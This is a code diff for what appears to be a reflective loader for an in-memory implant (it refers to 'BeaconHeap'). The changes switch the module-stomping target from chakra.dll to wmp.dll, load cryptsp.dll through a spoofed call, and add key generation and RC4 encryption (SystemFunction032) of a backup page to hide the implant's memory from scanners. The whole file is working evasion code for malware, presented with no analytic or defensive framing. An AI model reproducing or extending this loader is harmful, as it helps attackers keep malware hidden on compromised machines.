@@ -4,6 +4,8 @@
 
 #include "include.h"
 
+#define STOMP L"wmp.dll"
+
 typedef BOOLEAN ( WINAPI * DLLMAIN_T )(
         HMODULE     ImageBase,
         DWORD       Reason,
@@ -27,9 +29,15 @@ typedef struct
         D_API( RtlInitUnicodeString );
         D_API( LdrLoadDll );
 
+        D_API( RtlRandomEx );
+
     } ntdll;
 
-    D_API( SetProcessValidCallTargets )
+    struct
+    {
+        D_API( SystemFunction032 );
+
+    } cryptsp;
 
 } API, *PAPI;
 
@@ -52,11 +60,13 @@ typedef struct
 
 SECTION( B ) NTSTATUS resolveLoaderFunctions( PAPI pApi )
 {
-    PPEB    Peb;
-    HANDLE  hNtdll;
-    HANDLE  hKb;
+    PPEB                Peb;
+    HANDLE              hNtdll;
+    HANDLE              hKb;
+    HANDLE              hCs;
+    UNICODE_STRING      Uni = { 0 };
 
-    Peb = NtCurrentTeb()->ProcessEnvironmentBlock;
+    Peb    = NtCurrentTeb()->ProcessEnvironmentBlock;
     hNtdll = FindModule( H_LIB_NTDLL, Peb, NULL );
     hKb    = FindModule( H_LIB_KERNELBASE, Peb, NULL );
     
@@ -70,7 +80,7 @@ SECTION( B ) NTSTATUS resolveLoaderFunctions( PAPI pApi )
     pApi->ntdll.RtlCreateHeap           = FindFunction( hNtdll, H_API_RTLCREATEHEAP );
     pApi->ntdll.LdrLoadDll              = FindFunction( hNtdll, H_API_LDRLOADDLL );
     pApi->ntdll.RtlInitUnicodeString    = FindFunction( hNtdll, H_API_RTLINITUNICODESTRING );
-    pApi->SetProcessValidCallTargets    = FindFunction( hKb, H_API_SETPROCESSVALIDCALLTARGETS );
+    pApi->ntdll.RtlRandomEx             = FindFunction( hNtdll, H_API_RTLRANDOMEX );
 
     if( !pApi->ntdll.NtAllocateVirtualMemory ||
         !pApi->ntdll.NtProtectVirtualMemory  ||
@@ -78,6 +88,10 @@ SECTION( B ) NTSTATUS resolveLoaderFunctions( PAPI pApi )
     {
         return -1;
     };
+
+    pApi->ntdll.RtlInitUnicodeString( &Uni, C_PTR( OFFSET( L"cryptsp.dll" ) ) );
+    SPOOF( pApi->ntdll.LdrLoadDll, NULL, NULL, NULL, C_PTR( 0 ), &Uni, &hCs );
+    pApi->cryptsp.SystemFunction032 = FindFunction( hCs, H_API_SYSTEMFUNCTION032 );
 
     return STATUS_SUCCESS;
 };
@@ -192,9 +206,21 @@ SECTION( B ) VOID PatchPeb( PAPI Api, PVOID Module, PVOID AddrOfRet )
 
     return NULL;
 }
+
+SECTION( B ) VOID generateEncryptionKey( PAPI pApi, PSTUB Stub )
+{
+    ULONG Seed = SEED;
+    for( int i = 0; i < KEY_SIZE; i++ )
+    {
+        Seed = pApi->ntdll.RtlRandomEx( &Seed );
+        Stub->Key[i] = ( char )KEY_VALS[Seed % 61];
+    };
+};
+
 SECTION( B ) VOID Loader( VOID ) 
 {
     API               Api;
+    UNICODE_STRING    Uni                = { 0 };
     REG               Reg;
     NTSTATUS          Status;
     PVOID             MemoryBuffer;
@@ -205,6 +231,8 @@ SECTION( B ) VOID Loader( VOID )
     PIMAGE_NT_HEADERS OverloadNt         = NULL;
     PVOID             BackupPage         = NULL;
     DWORD64           SzBackupPage       = 0;
+    USTRING           S32Key;
+    USTRING           S32Data;
     
     RtlSecureZeroMemory( &Api, sizeof( Api ) );
     RtlSecureZeroMemory( &Reg, sizeof( Reg ) );
@@ -213,11 +241,10 @@ SECTION( B ) VOID Loader( VOID )
     {
         calculateRegions( &Reg );
 
-        OverloadModule = FindModule( HashString( OFFSET( L"chakra.dll" ), NULL ), NULL, NULL );
+        OverloadModule = FindModule( HashString( OFFSET( STOMP ), NULL ), NULL, NULL );
         if ( !OverloadModule )
         {
-            UNICODE_STRING      Uni = { 0 };
-            Api.ntdll.RtlInitUnicodeString( &Uni, C_PTR( OFFSET( L"chakra.dll" ) ) );
+            Api.ntdll.RtlInitUnicodeString( &Uni, C_PTR( OFFSET( STOMP ) ) );
             ULONG flags = 0x2;
             SPOOF( Api.ntdll.LdrLoadDll, NULL, NULL, NULL, &flags, &Uni, &OverloadModule ); // don't resolve references + don't execute dllmain stuff
         }
@@ -249,6 +276,16 @@ SECTION( B ) VOID Loader( VOID )
             
             installHooks( Map, MemoryBuffer, Reg.NT );
 
+            // Encrypt backup page and store key in stub
+            generateEncryptionKey( &Api, MemoryBuffer );
+            S32Key.len  = S32Key.maxlen = KEY_SIZE;
+            S32Key.str  = ( ( PSTUB )MemoryBuffer )->Key;
+            S32Data.len = S32Data.maxlen = SzBackupPage;
+            S32Data.str = ( PBYTE )( BackupPage );
+
+            // Encrypt the backup page
+            SPOOF( Api.cryptsp.SystemFunction032, NULL, NULL, &S32Data, &S32Key );
+
             // Update data stubs in stomped .text
             ( ( PSTUB )MemoryBuffer )->ExecRegion       = BackupPage+IMAGE_FIRST_SECTION( OverloadNt )->SizeOfRawData;
             Reg.Exec += IMAGE_FIRST_SECTION( Reg.NT )->VirtualAddress;
@@ -256,6 +293,7 @@ SECTION( B ) VOID Loader( VOID )
             ( ( PSTUB )MemoryBuffer )->ExecRegionSize   = Reg.Exec;
             ( ( PSTUB )MemoryBuffer )->OriginalText     = BackupPage;
             ( ( PSTUB )MemoryBuffer )->OriginalTextSize = IMAGE_FIRST_SECTION( OverloadNt )->SizeOfRawData;
+            ( ( PSTUB )MemoryBuffer )->BackupPageSize   = SzBackupPage;
 
             // Fill in rest of stuff in data stubs in both the backup page and the stomped .text
             fillStub( MemoryBuffer, BeaconHeap, Reg.Full );
